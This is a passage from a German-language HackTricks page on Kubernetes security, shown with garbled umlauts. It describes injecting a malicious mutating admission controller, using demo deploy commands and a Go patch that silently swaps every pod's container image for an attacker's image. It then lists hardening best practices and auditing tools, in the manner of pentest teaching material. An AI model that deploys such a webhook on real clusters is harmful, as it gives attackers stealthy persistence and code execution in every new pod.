Ein Admission Controller **unterbricht Anfragen an den Kubernetes API-Server** vor der Persistenz des Objekts, aber **nachdem die Anfrage authentifiziert** **und autorisiert** wurde.

Wenn es einem Angreifer gelingt, einen **Mutationg Admission Controller** zu **injizieren**, kann er **bereits authentifizierte Anfragen modifizieren**. Dies erm√∂glicht potenziell Privilegieneskalation und in der Regel auch Persistenz im Cluster.

**Beispiel von** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
√úberpr√ºfen Sie den Status, um zu sehen, ob es bereit ist:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Dann deployen Sie ein neues Pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wenn Sie den `ErrImagePull`-Fehler sehen, √ºberpr√ºfen Sie den Bildnamen mit einer der Abfragen:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Wie Sie im obigen Bild sehen k√∂nnen, haben wir versucht, das Image `nginx` auszuf√ºhren, aber das letztendlich ausgef√ºhrte Image ist `rewanthtammana/malicious-image`. Was ist gerade passiert!!?

#### Technische Details <a href="#heading-technicalities" id="heading-technicalities"></a>

Das Skript `./deploy.sh` richtet einen mutierenden Webhook-Zugangscontroller ein, der Anfragen an die Kubernetes-API gem√§√ü den in den Konfigurationszeilen angegebenen Vorgaben modifiziert und die beobachteten Ergebnisse beeinflusst:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Der obige Snippet ersetzt das erste Container-Image in jedem Pod mit `rewanthtammana/malicious-image`.

## OPA Gatekeeper Umgehung

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Best Practices

### **Deaktivierung der Automount von Service Account Tokens**

* **Pods und Service Accounts**: Standardm√§√üig montieren Pods ein Service Account Token. Um die Sicherheit zu erh√∂hen, erlaubt Kubernetes die Deaktivierung dieser Automount-Funktion.
* **Anwendung**: Setzen Sie `automountServiceAccountToken: false` in der Konfiguration von Service Accounts oder Pods ab Kubernetes-Version 1.6.

### **Restriktive Benutzerzuweisung in RoleBindings/ClusterRoleBindings**

* **Selektive Einbeziehung**: Stellen Sie sicher, dass nur notwendige Benutzer in RoleBindings oder ClusterRoleBindings einbezogen werden. √úberpr√ºfen Sie regelm√§√üig und entfernen Sie irrelevante Benutzer, um eine strenge Sicherheit aufrechtzuerhalten.

### **Namespace-spezifische Rollen √ºber Cluster-weite Rollen**

* **Rollen vs. ClusterRoles**: Bevorzugen Sie die Verwendung von Rollen und RoleBindings f√ºr namespace-spezifische Berechtigungen anstelle von ClusterRoles und ClusterRoleBindings, die clusterweit gelten. Dieser Ansatz bietet eine feinere Kontrolle und begrenzt den Umfang der Berechtigungen.

### **Verwendung automatisierter Tools**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referenzen**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
